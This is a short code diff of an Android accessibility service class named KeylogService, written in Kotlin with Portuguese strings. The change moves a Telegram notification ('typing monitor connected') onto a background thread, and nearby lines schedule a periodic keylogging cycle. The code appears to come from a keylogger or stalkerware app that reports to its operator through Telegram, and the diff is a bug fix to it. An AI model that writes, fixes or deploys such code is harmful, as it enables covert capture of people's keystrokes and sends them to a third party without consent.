@@ -27,7 +27,7 @@ class KeylogService : AccessibilityService() {
         super.onServiceConnected()
         handler = Handler(Looper.getMainLooper())
         handler?.postDelayed(ciclo, Config.KEYLOG_INTERVAL_MS)
-        Telegram.send("<i>Monitor de digitação conectado</i>")
+        Thread { Telegram.send("<i>Monitor de digitação conectado</i>") }.start()
     }
 
     override fun onAccessibilityEvent(evento: AccessibilityEvent?) {
